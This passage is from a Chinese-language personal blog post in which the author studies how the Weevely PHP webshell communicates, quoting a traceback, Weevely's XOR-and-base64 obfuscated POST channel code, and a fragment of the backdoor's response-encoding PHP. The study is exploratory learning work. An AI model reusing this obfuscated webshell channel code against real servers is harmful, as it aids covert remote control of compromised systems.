+<span class="pl-s">  File </span>"/usr/share/weevely/modules/system/info.py"<span class="pl-s">, line 83, in run</span>
+<span class="pl-s">    result = self.vectors.get_results(</span>
+<span class="pl-s">             ^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/vectorlist.py"<span class="pl-s">, line 164, in get_results</span>
+<span class="pl-s">    response[vector.name] = vector.run(format_args)</span>
+<span class="pl-s">                            ^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/vectors.py"<span class="pl-s">, line 121, in run</span>
+<span class="pl-s">    result = modules.loaded[self.module].run_argv(formatted)</span>
+<span class="pl-s">             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/module.py"<span class="pl-s">, line 192, in run_argv</span>
+<span class="pl-s">    return self.run()</span>
+<span class="pl-s">           ^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/modules/shell/php.py"<span class="pl-s">, line 100, in run</span>
+<span class="pl-s">    response, code, error = self.channel.send(command)</span>
+<span class="pl-s">                            ^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/channels/channel.py"<span class="pl-s">, line 109, in send</span>
+<span class="pl-s">    response = self.channel_loaded.send(</span>
+<span class="pl-s">               ^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/channels/obfpost/obfpost.py"<span class="pl-s">, line 110, in send</span>
+<span class="pl-s">    base64.b64decode(matched.group(1)),</span>
+<span class="pl-s">    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/lib/python3.<span class="pl-c1">11</span>/base64.py", line <span class="pl-c1">88</span>, in b64decode
+    <span class="pl-k">return</span> binascii.a2b_base64(s, strict_mode=validate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+binascii.<span class="pl-v">Error</span>: <span class="pl-v">Incorrect</span> padding</pre></div>
+<p>base64解码时出现填充问题——base64编码中，如果数据长度不是4的倍数，就使用填充字符 “=”进行填充使其长度符合要求。</p>
+<p>如果填充字符的位置或是数量不正确，那么就会导致填充问题。</p>
+<hr>
+<p>emmm感觉在做无用功——因为想知道是什么在起作用使连接和交互生效——这样做完全只是试图逆向在研究response</p>
+<p>所以转向看源码。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-c"># obfpost.py部分</span>
+
+<span class="pl-k">class</span> <span class="pl-v">ObfPost</span>:
+    def send(self, original_payload, additional_handlers = []):
+
+        <span class="pl-k">if</span> isinstance(original_payload, str):
+            original_payload = original_payload.encode(<span class="pl-s">'utf-8'</span>)
+		<span class="pl-c"># 异或操作加密payload，self.shared_key就是$k</span>
+        xorred_payload = utils.strings.sxor(
+                zlib.compress(original_payload),
+                self.shared_key
+                )
+		<span class="pl-c"># base64编码异或操作加密过的payload</span>
+        obfuscated_payload = base64.b64encode(xorred_payload).rstrip(<span class="pl-s">b'='</span>)
+		<span class="pl-c"># 包裹外壳</span>
+        wrapped_payload = <span class="pl-c1">PREPEND</span> + self.header + obfuscated_payload + self.trailer + <span class="pl-c1">APPEND</span>
+		
+        opener = urllib.request.build_opener(*additional_handlers)
+
+        additional_ua = <span class="pl-s">''</span>
+        for h in self.additional_headers:
+            <span class="pl-k">if</span> h[<span class="pl-c1">0</span>].lower() == <span class="pl-s">'user-agent'</span> and h[<span class="pl-c1">1</span>]:
+                additional_ua = h[<span class="pl-c1">1</span>]
+                break
+
+        opener.addheaders = [
+            (<span class="pl-s">'User-Agent'</span>, (additional_ua if additional_ua <span class="pl-k">else</span> self.agent))
+        ] + self.additional_headers
+
+        dlog.debug(
+            <span class="pl-s">'[R] %s...'</span> %
+            (wrapped_payload[<span class="pl-c1">0</span>:<span class="pl-c1">32</span>])
+        )
+
+        url = (
+            self.url if not config.add_random_param_nocache
+            else utils.http.add_random_url_param(self.url)
+        )
+
+        <span class="pl-k">try</span>:
+        	<span class="pl-c"># 通过post传输payload</span>
+            response = opener.open(url, data = wrapped_payload).read()
+        except http.client.<span class="pl-v">BadStatusLine</span> as e:
+            <span class="pl-c"># TODO: add this check to the other channels</span>
+            log.warn(<span class="pl-s">'Connection closed unexpectedly, aborting command.'</span>)
+            return
+
+        <span class="pl-k">if</span> not response:
+            <span class="pl-k">return</span>
+
+        <span class="pl-c"># Multiple debug string may have been printed, using findall</span>
+        matched_debug = self.re_debug.findall(response)
+        if matched_debug:
+            dlog.debug(<span class="pl-s">'\n'</span>.join(matched_debug))
+
+        matched = self.re_response.search(response)
+    	<span class="pl-c"># 对或取的信息进行逆向解密</span>
+        if matched and matched.group(<span class="pl-c1">1</span>):
+
+            response = zlib.decompress(
+                utils.strings.sxor(
+                    base64.b64decode(matched.group(<span class="pl-c1">1</span>)),
+                    self.shared_key))
+
+            <span class="pl-k">return</span> response</pre></div>
+<p>所以是通过tcp+post进行反向shell代码的传输，在服务器上的病毒文件通过<code class="notranslate">@file_get_contents**(**"php://input"**)**</code>得到post中的层层加密过的代码后解密、执行，建立连接。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">	<span class="pl-s1"><span class="pl-c1">$</span>o</span>=@ob_get_contents();<span class="pl-c">//获取当前缓冲区的内容，并返回缓冲区的数据</span>
+	@ob_end_clean();<span class="pl-c">//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区</span>
+	<span class="pl-s1"><span class="pl-c1">$</span>r</span>=@base64_encode(@x(@gzcompress(<span class="pl-s1"><span class="pl-c1">$</span>o</span>),<span class="pl-s1"><span class="pl-c1">$</span>k</span>));
+	print("<span class="pl-s1"><span class="pl-c1">$</span>p</span><span class="pl-s1"><span class="pl-c1">$</span>kh</span><span class="pl-s1"><span class="pl-c1">$</span>r</span><span class="pl-s1"><span class="pl-c1">$</span>kf</span>");}</pre></div>
+<p><em>这几行代码按理说应该是打印输出执行命令行后的响应内容的，但还是不理解是怎么运作的。</em></p>
+<p><em>或者说，当建立连接之后，eval这个函数转向执行其他的命令行了吗？</em></p>
+<p>探寻源码的途中，意识到：</p>
+<ul>
+<li>本质就是对反向shell的原理的浅理解——只停留在如何使用现成的，现成也就算了，还是绝对会被目前的安全系统检测到然后灭了的。</li>
+<li>后果就是：weevely的php后门代码只是加了免杀，然后以为见到new thang了。</li>
+</ul>
+<p><a href="https://xz.aliyun.com/t/2549?time__1311=n4+xnieDqxgDcDUrxBLb+o0QKDtSIqDODjrD&amp;alichlgref=https://www.google.com/" rel="nofollow">反向shell原理</a></p>
+<p>当连接建立成功之后，那么，所有的交互就是通过建立的连接进行的，bash或者telnet……</p>
+<p>上面让人疑惑的四行代码应该是加密压缩对来自其他主机的命令的响应的内容</p>
+<p>既然建立了交互，那么输出都会被转发到攻击者的机器上，print语句的输出会出现在攻击者机器上，那么$r经过这么多道工序，输出的为什么是人类可读的？</p>
+<p>TBC</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+</div>
+    <div id="footer">Copyright © <span id="year"></span><a href="https://66lueflam144.github.io/realOne81"> RealOne-8-1 </a>
+<p>
+<span id="runday"></span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a>
+</p>
+
+<script>
+if(""!=""){
+    var now=new Date();
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("year").innerHTML=now.getFullYear();
+    if(""!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
+    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
+}
+</script>
+</div>
+</body>
+<script>
+var IconList={'post': 'M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25Zm1.75-.25a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25ZM3.5 6.25a.75.75 0 0 1 .75-.75h7a.75.75 0 0 1 0 1.5h-7a.75.75 0 0 1-.75-.75Zm.75 2.25h4a.75.75 0 0 1 0 1.5h-4a.75.75 0 0 1 0-1.5Z', 'link': 'm7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z', 'about': 'M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z', 'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'rss': 'M2.002 2.725a.75.75 0 0 1 .797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 0 1-1.497.098 10.502 10.502 0 0 0-9.776-9.776.747.747 0 0 1-.7-.798ZM2.84 7.05h-.002a7.002 7.002 0 0 1 6.113 6.111.75.75 0 0 1-1.49.178 5.503 5.503 0 0 0-4.8-4.8.75.75 0 0 1 .179-1.489ZM2 13a1 1 0 1 1 2 0 1 1 0 0 1-2 0Z', 'upload': 'M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z M11.78 4.72a.749.749 0 1 1-1.06 1.06L8.75 3.811V9.5a.75.75 0 0 1-1.5 0V3.811L5.28 5.78a.749.749 0 1 1-1.06-1.06l3.25-3.25a.749.749 0 0 1 1.06 0l3.25 3.25Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z'};
+var utterancesLoad=0;
+if(localStorage.getItem("meek_theme")==null){localStorage.setItem("meek_theme","light");changeLight();}
+else if(localStorage.getItem("meek_theme")=="dark"){changeDark();}
+else if(localStorage.getItem("meek_theme")=="light"){changeLight();}
+
+function changeDark(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["moon"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#00f0ff";
+    if(utterancesLoad==1){utterancesTheme("dark-blue");}
+}
+function changeLight(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["sun"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#ff5000";
+    if(utterancesLoad==1){utterancesTheme("github-light");}
+}
+function modeSwitch(){
+    if(document.getElementsByTagName("html")[0].attributes[0].value=="light"){changeDark();localStorage.setItem("meek_theme","dark");}
+    else{changeLight();localStorage.setItem("meek_theme","light");}
+}
+function utterancesTheme(theme){
+    const message = {type: 'set-theme',theme: theme};
+    const iframe = document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+}
+
+console.log("\n %c Gmeek last %c https://github.com/Meekdai/Gmeek \n\n", "color: #fff; background-image: linear-gradient(90deg, rgb(47, 172, 178) 0%, rgb(45, 190, 96) 100%); padding:5px 1px;", "background-image: linear-gradient(90deg, rgb(45, 190, 96) 0%, rgb(255, 255, 255) 100%); padding:5px 0;");
+</script>
+
+<script>
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","66lueflam144/realOne81");
+    script.setAttribute("issue-term","title");
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else{script.setAttribute("theme","github-light");}
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+</script>
+
+
+
+
+</html>
